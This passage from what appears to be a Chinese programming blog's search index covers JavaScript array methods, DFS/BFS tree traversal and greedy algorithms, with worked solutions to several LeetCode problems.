title="3、map 返回一个新数组，数组中的每个元素为调用function的结果"></a>3、map 返回一个新数组，数组中的每个元素为调用function的结果</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>];</span><br><span class="line">arr.map(<span class="function">(<span class="params">item,index</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> item * <span class="number">2</span>;       <span class="comment">//[2,4,6,8,10]</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h4 id="4、filter-返回一个符合function条件的元素数组（过滤）"><a href="#4、filter-返回一个符合function条件的元素数组（过滤）" class="headerlink" title="4、filter 返回一个符合function条件的元素数组（过滤）"></a>4、filter 返回一个符合function条件的元素数组（过滤）</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>];</span><br><span class="line">arr.filter(<span class="function">(<span class="params">item,index</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> item &gt; <span class="number">3</span>;       <span class="comment">//[4,5]</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h4 id="5、reduce-让数组中的前项和后项做某种运算，返回累计的最终值"><a href="#5、reduce-让数组中的前项和后项做某种运算，返回累计的最终值" class="headerlink" title="5、reduce 让数组中的前项和后项做某种运算，返回累计的最终值"></a>5、reduce 让数组中的前项和后项做某种运算，返回累计的最终值</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>];</span><br><span class="line">arr.reduce(<span class="function">(<span class="params">prev,next</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> prev + next;       <span class="comment">//15</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h4 id="6、every-返回一个Boolean值，判断数组中每一个元素是否符合function的条件"><a href="#6、every-返回一个Boolean值，判断数组中每一个元素是否符合function的条件" class="headerlink" title="6、every 返回一个Boolean值，判断数组中每一个元素是否符合function的条件"></a>6、every 返回一个Boolean值，判断数组中每一个元素是否符合function的条件</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>];</span><br><span class="line">arr.every(<span class="function">(<span class="params">item,index</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> item &gt; <span class="number">0</span>;       <span class="comment">//true(所有元素都满足才为true)</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h4 id="7、some-返回一个Boolean值，判断数组中是否有元素符合function的条件"><a href="#7、some-返回一个Boolean值，判断数组中是否有元素符合function的条件" class="headerlink" title="7、some 返回一个Boolean值，判断数组中是否有元素符合function的条件"></a>7、some 返回一个Boolean值，判断数组中是否有元素符合function的条件</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>];</span><br><span class="line">arr.some(<span class="function">(<span class="params">item,index</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> item &gt; <span class="number">4</span>;       <span class="comment">//true(只要有一个满足即可)</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ES6 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>算法-DFS、BFS</title>
      <link href="2020/10/29/%E7%AE%97%E6%B3%95-DFS%E3%80%81BFS/"/>
      <url>2020/10/29/%E7%AE%97%E6%B3%95-DFS%E3%80%81BFS/</url>
      
        <content type="html"><![CDATA[<ul><li>深度优先遍历</li><li>广度优先遍历</li><li>求根到叶子节点数字之和（DFS）</li><li>单词接龙（BFS）</li><li>N叉树的最大深度（BFS）</li></ul><a id="more"></a><h2 id="深度优先，广度优先（层次遍历）"><a href="#深度优先，广度优先（层次遍历）" class="headerlink" title="深度优先，广度优先（层次遍历）"></a>深度优先，广度优先（层次遍历）</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//深度优先的递归实现</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deepTraversal</span>(<span class="params">node,nodeList</span>) </span>&#123;  </span><br><span class="line">    <span class="keyword">if</span> (node) &#123;    </span><br><span class="line">            nodeList.push(node);    </span><br><span class="line">            <span class="keyword">var</span> children = node.children;    </span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; children.length; i++) </span><br><span class="line">      <span class="comment">//每次递归的时候将  需要遍历的节点  和 节点所存储的数组传下去</span></span><br><span class="line">                deepTraversal(children[i],nodeList);    </span><br><span class="line">        &#125;    </span><br><span class="line">    <span class="keyword">return</span> nodeList;  </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">//深度优先非递归</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deepTraversal</span>(<span class="params">node</span>) </span>&#123;  </span><br><span class="line">    <span class="keyword">var</span> nodeList = [];  </span><br><span class="line">    <span class="keyword">if</span> (node) &#123;  </span><br><span class="line">        <span class="keyword">var</span> stack = [];  </span><br><span class="line">        stack.push(node);  </span><br><span class="line">        <span class="keyword">while</span> (stack.length != <span class="number">0</span>) &#123;  </span><br><span class="line">            <span class="keyword">var</span> childrenItem = stack.pop();  </span><br><span class="line">            nodeList.push(childrenItem);  </span><br><span class="line">            <span class="keyword">var</span> childrenList = childrenItem.children;  </span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = childrenList.length - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)  <span class="comment">//从右向左进栈</span></span><br><span class="line">                stack.push(childrenList[i]);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">return</span> nodeList;  </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">//广度非递归</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wideTraversal</span>(<span class="params">node</span>) </span>&#123;  </span><br><span class="line">    <span class="keyword">var</span> nodes = [];  </span><br><span class="line">    <span class="keyword">if</span> (node != <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="keyword">var</span> queue = [];  </span><br><span class="line">        queue.unshift(node);     <span class="comment">//加入根节点</span></span><br><span class="line">        <span class="keyword">while</span> (queue.length != <span class="number">0</span>) &#123;  </span><br><span class="line">            <span class="keyword">var</span> item = queue.shift();  <span class="comment">//拿出队头元素</span></span><br><span class="line">            nodes.push(item);          <span class="comment">//加入结果</span></span><br><span class="line">            <span class="keyword">var</span> children = item.children;  <span class="comment">//队友元素的孩子加入队尾</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; children.length; i++)  </span><br><span class="line">                queue.push(children[i]);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> nodes;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="求根到叶子节点数字之和"><a href="#求根到叶子节点数字之和" class="headerlink" title="求根到叶子节点数字之和"></a>求根到叶子节点数字之和</h2><ul><li><a href="https://leetcode-cn.com/problems/sum-root-to-leaf-numbers/" target="_blank" rel="noopener">leetcode129</a></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">给定一个二叉树，它的每个结点都存放一个 0-9 的数字，每条从根到叶子节点的路径都代表一个数字。</span><br><span class="line">例如，从根到叶子节点路径 1-&gt;2-&gt;3 代表数字 123。</span><br><span class="line">计算从根到叶子节点生成的所有数字之和。</span><br><span class="line">说明: 叶子节点是指没有子节点的节点。</span><br><span class="line"></span><br><span class="line">示例 1:</span><br><span class="line">输入: [1,2,3]</span><br><span class="line">    1</span><br><span class="line">   / \</span><br><span class="line">  2   3</span><br><span class="line">输出: 25</span><br><span class="line">解释:</span><br><span class="line">从根到叶子节点路径 1-&gt;2 代表数字 12.</span><br><span class="line">从根到叶子节点路径 1-&gt;3 代表数字 13.</span><br><span class="line">因此，数字总和 = 12 + 13 = 25.</span><br><span class="line"></span><br><span class="line">示例 2:</span><br><span class="line">输入: [4,9,0,5,1]</span><br><span class="line">    4</span><br><span class="line">   / \</span><br><span class="line">  9   0</span><br><span class="line"> / \</span><br><span class="line">5   1</span><br><span class="line">输出: 1026</span><br><span class="line">解释:</span><br><span class="line">从根到叶子节点路径 4-&gt;9-&gt;5 代表数字 495.</span><br><span class="line">从根到叶子节点路径 4-&gt;9-&gt;1 代表数字 491.</span><br><span class="line">从根到叶子节点路径 4-&gt;0 代表数字 40.</span><br><span class="line">因此，数字总和 = 495 + 491 + 40 = 1026.</span><br></pre></td></tr></table></figure><ul><li>从根节点开始，遍历每个节点，如果遇到叶子节点，则将叶子节点对应的数字加到数字之和。如果当前节点不是叶子节点，则计算其子节点对应的数字，然后对子节点递归遍历。</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> dfs = <span class="function"><span class="keyword">function</span>(<span class="params">root, n</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 若节点是 null 直接返回 0</span></span><br><span class="line">    <span class="keyword">if</span> (root === <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 不是空节点就计算一下加到目前的值</span></span><br><span class="line">    <span class="keyword">const</span> sum = n * <span class="number">10</span> + root.val;</span><br><span class="line">    <span class="comment">// 若是根节点返回该计算值，一条路就走完了</span></span><br><span class="line">    <span class="keyword">if</span> (root.left == <span class="literal">null</span> &amp;&amp; root.right == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    <span class="comment">// 不是根节点则递归遍历</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> dfs(root.left, sum) + dfs(root.right, sum);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> sumNumbers = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> dfs(root, <span class="number">0</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="单词接龙"><a href="#单词接龙" class="headerlink" title="单词接龙"></a>单词接龙</h2><ul><li>题目来源：<a href="https://leetcode-cn.com/problems/word-ladder/" target="_blank" rel="noopener">leetcode127</a></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">给定两个单词（beginWord 和 endWord）和一个字典，找到从 beginWord 到 endWord 的最短转换序列的长度。转换需遵循如下规则：</span><br><span class="line"></span><br><span class="line">每次转换只能改变一个字母。</span><br><span class="line">转换过程中的中间单词必须是字典中的单词。</span><br><span class="line">说明:</span><br><span class="line"></span><br><span class="line">如果不存在这样的转换序列，返回 0。</span><br><span class="line">所有单词具有相同的长度。</span><br><span class="line">所有单词只由小写字母组成。</span><br><span class="line">字典中不存在重复的单词。</span><br><span class="line">你可以假设 beginWord 和 endWord 是非空的，且二者不相同。</span><br><span class="line"></span><br><span class="line">示例 1:</span><br><span class="line">输入:</span><br><span class="line">beginWord = &quot;hit&quot;,</span><br><span class="line">endWord = &quot;cog&quot;,</span><br><span class="line">wordList = [&quot;hot&quot;,&quot;dot&quot;,&quot;dog&quot;,&quot;lot&quot;,&quot;log&quot;,&quot;cog&quot;]</span><br><span class="line">输出: 5</span><br><span class="line">解释: 一个最短转换序列是 &quot;hit&quot; -&gt; &quot;hot&quot; -&gt; &quot;dot&quot; -&gt; &quot;dog&quot; -&gt; &quot;cog&quot;,</span><br><span class="line">     返回它的长度 5。</span><br><span class="line">     </span><br><span class="line">示例 2:</span><br><span class="line">输入:</span><br><span class="line">beginWord = &quot;hit&quot;</span><br><span class="line">endWord = &quot;cog&quot;</span><br><span class="line">wordList = [&quot;hot&quot;,&quot;dot&quot;,&quot;dog&quot;,&quot;lot&quot;,&quot;log&quot;]</span><br><span class="line">输出: 0</span><br><span class="line">解释: endWord &quot;cog&quot; 不在字典中，所以无法进行转换。</span><br></pre></td></tr></table></figure><ul><li>抽象为图，若两个单词可以转换，则连一条双向边，BFS求起点到终点最短路径</li><li>优化为：求图的最短路径，使用队列 + BFS 实现</li><li>参考题解：<a href="https://leetcode-cn.com/problems/word-ladder/solution/bfs-de-ying-yong-by-muyunyun/" target="_blank" rel="noopener">BFS的应用</a></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ladderLength = <span class="function"><span class="keyword">function</span>(<span class="params">beginWord, endWord, wordList</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!wordList.includes(endWord)) <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">let</span> queue = []</span><br><span class="line">    <span class="comment">// 用一个对象维护当前节点是否访问过</span></span><br><span class="line">    <span class="keyword">let</span> visitedObj = &#123;</span><br><span class="line">        beginWord: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 用 level 记录当前路径长度</span></span><br><span class="line">    queue.push(&#123; <span class="attr">word</span>: beginWord, <span class="attr">level</span>: <span class="number">1</span> &#125;)</span><br><span class="line">    <span class="comment">// 队列实现 BFS</span></span><br><span class="line">    <span class="keyword">while</span> (queue.length) &#123;</span><br><span class="line">        <span class="keyword">let</span> &#123; word, level &#125; = queue.shift()</span><br><span class="line">        <span class="keyword">if</span> (visitedObj[word]) <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; wordList.length; i++) &#123;</span><br><span class="line">            <span class="comment">// 若只有一个字母不同则证明是相邻两边，入队列</span></span><br><span class="line">            <span class="keyword">if</span> (isOneDiff(word, wordList[i])) &#123;</span><br><span class="line">                <span class="keyword">if</span> (wordList[i] == endWord) &#123;</span><br><span class="line">                    <span class="keyword">return</span> level + <span class="number">1</span></span><br><span class="line">                &#125;</span><br><span class="line">                queue.push(&#123; <span class="attr">word</span>: wordList[i], <span class="attr">level</span>: level + <span class="number">1</span> &#125;)</span><br><span class="line">                visitedObj[word] = <span class="literal">true</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断两个单词是否只有一个字母不同</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isOneDiff</span>(<span class="params">source, target</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> diff = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; source.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (source[i] !== target[i]) &#123;</span><br><span class="line">            diff ++</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (diff === <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="N叉树的最大深度"><a href="#N叉树的最大深度" class="headerlink" title="N叉树的最大深度"></a>N叉树的最大深度</h2><ul><li>题目来源:<a href="https://leetcode-cn.com/problems/maximum-depth-of-n-ary-tree/" target="_blank" rel="noopener">leetcode559</a></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">给定一个 N 叉树，找到其最大深度。</span><br><span class="line"></span><br><span class="line">最大深度是指从根节点到最远叶子节点的最长路径上的节点总数。</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// BFS</span></span><br><span class="line"><span class="keyword">var</span> maxDepth = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root === <span class="literal">null</span>) <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> (root.children.length === <span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">let</span> queue = []</span><br><span class="line">    <span class="keyword">let</span> depthArr = []</span><br><span class="line">    queue.push(&#123; <span class="attr">node</span>: root, <span class="attr">depth</span>: <span class="number">1</span> &#125;)</span><br><span class="line">    <span class="keyword">while</span> (queue.length) &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123; node, depth &#125; = queue.shift()</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; node.children.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (node.children[i].children.length === <span class="number">0</span>) &#123;</span><br><span class="line">                depthArr.push(depth + <span class="number">1</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            &#125;</span><br><span class="line">            queue.push(&#123; <span class="attr">node</span>: node.children[i], <span class="attr">depth</span>: depth + <span class="number">1</span> &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Math</span>.max(...depthArr)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 递归</span></span><br><span class="line"><span class="keyword">var</span> maxDepth = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root === <span class="literal">null</span>) <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">let</span> num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; root.children.length; i++) &#123;</span><br><span class="line">        num = <span class="built_in">Math</span>.max(num, maxDepth(root.children[i]))</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> num + <span class="number">1</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>算法-贪心</title>
      <link href="2020/10/28/%E7%AE%97%E6%B3%95-%E8%B4%AA%E5%BF%83/"/>
      <url>2020/10/28/%E7%AE%97%E6%B3%95-%E8%B4%AA%E5%BF%83/</url>
      
        <content type="html"><![CDATA[<ul><li>贪心算法</li><li>移掉 k 位数字</li><li>非递增顺序的最小子序列</li></ul><a id="more"></a><h2 id="贪心算法"><a href="#贪心算法" class="headerlink" title="贪心算法"></a>贪心算法</h2><p>贪心算法（又称贪婪算法）是指，在对问题求解时，总是做出在当前看来是最好的选择。也就是说，不从整体最优上加以考虑，算法得到的是在某种意义上的局部最优解 。</p><p><strong>贪心算法一般按如下步骤进行： </strong></p><p>①建立数学模型来描述问题 。</p><p>②把求解的问题分成若干个子问题。</p><p>③对每个子问题求解，得到子问题的局部最优解 。</p><p>④把子问题的解局部最优解合成原来解问题的一个解  。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">贪心算法是一种对某些求最优解问题的更简单、更迅速的设计技术。贪心算法的特点是一步一步地进行，常以当前情况为基础根据某个优化测度作最优选择，而不考虑各种可能的整体情况，省去了为找最优解要穷尽所有可能而必须耗费的大量时间。贪心算法采用自顶向下，以迭代的方法做出相继的贪心选择，每做一次贪心选择，就将所求问题简化为一个规模更小的子问题，通过每一步贪心选择，可得到问题的一个最优解。虽然每一步上都要保证能获得局部最优解，但由此产生的全局解有时不一定是最优的，所以贪心算法不要回溯</span><br></pre></td></tr></table></figure><p><strong>存在的问题</strong></p><ul><li>不能保证求得的最后解是最佳的</li><li>不能用来求最大值或最小值的问题</li><li>只能求满足某些约束条件的可行解的范围</li></ul><h2 id="移掉-k-位数字"><a href="#移掉-k-位数字" class="headerlink" title="移掉 k 位数字"></a>移掉 k 位数字</h2><p>具体看 <a href="https://www.jinjingxuan.com/2020/10/22/%E7%AE%97%E6%B3%95-%E6%A0%88/#more" target="_blank" rel="noopener">算法-栈</a> 中的最后一题</p><h2 id="非递增顺序的最小子序列"><a href="#非递增顺序的最小子序列" class="headerlink" title="非递增顺序的最小子序列"></a>非递增顺序的最小子序列</h2><ul><li><a href="https://leetcode-cn.com/problems/minimum-subsequence-in-non-increasing-order" target="_blank" rel="noopener">leetcode1403</a></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">给你一个数组 nums，请你从中抽取一个子序列，满足该子序列的元素之和 严格 大于未包含在该子序列中的各元素之和。</span><br><span class="line"></span><br><span class="line">如果存在多个解决方案，只需返回 长度最小 的子序列。如果仍然有多个解决方案，则返回 元素之和最大 的子序列。</span><br><span class="line"></span><br><span class="line">与子数组不同的地方在于，「数组的子序列」不强调元素在原数组中的连续性，也就是说，它可以通过从数组中分离一些（也可能不分离）元素得到。</span><br><span class="line"></span><br><span class="line">注意，题目数据保证满足所有约束条件的解决方案是 唯一 的。同时，返回的答案应当按 非递增顺序 排列。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">示例 1：</span><br><span class="line">输入：nums = [4,3,10,9,8]</span><br><span class="line">输出：[10,9] </span><br><span class="line">解释：子序列 [10,9] 和 [10,8] 是最小的、满足元素之和大于其他各元素之和的子序列。但是 [10,9] 的元素之和最大。 </span><br><span class="line"></span><br><span class="line">示例 2：</span><br><span class="line">输入：nums = [4,4,7,6,7]</span><br><span class="line">输出：[7,7,6] </span><br><span class="line">解释：子序列 [7,7] 的和为 14 ，不严格大于剩下的其他元素之和（14 = 4 + 4 + 6）。因此，[7,6,7] 是满足题意的最小子序列。注意，元素按非递增顺序返回。  </span><br><span class="line"></span><br><span class="line">示例 3：</span><br><span class="line">输入：nums = [6]</span><br><span class="line">输出：[6]</span><br></pre></td></tr></table></figure><ul><li>数组从大到小排序</li><li>取出最大值放入 ans 中，如果不选这个最大值将不是最优解，选了之后继续进行下一步子问题的选择(贪心)</li><li>直到取出元素大于所有元素和的一半为止</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> minSubsequence = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> sum = <span class="number">0</span></span><br><span class="line">    <span class="keyword">let</span> tmp = <span class="number">0</span></span><br><span class="line">    <span class="keyword">let</span> ans = []</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i <span class="keyword">of</span> nums) &#123;</span><br><span class="line">        sum += i</span><br><span class="line">    &#125;</span><br><span class="line">    nums.sort(<span class="function">(<span class="params">a, b</span>) =&gt;</span> b - a)</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">        tmp += nums[i]</span><br><span class="line">        <span class="keyword">if</span> (tmp * <span class="number">2</span> &gt; sum) &#123;</span><br><span class="line">            ans = nums.slice(<span class="number">0</span>, i + <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> ans</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;   </span><br><span 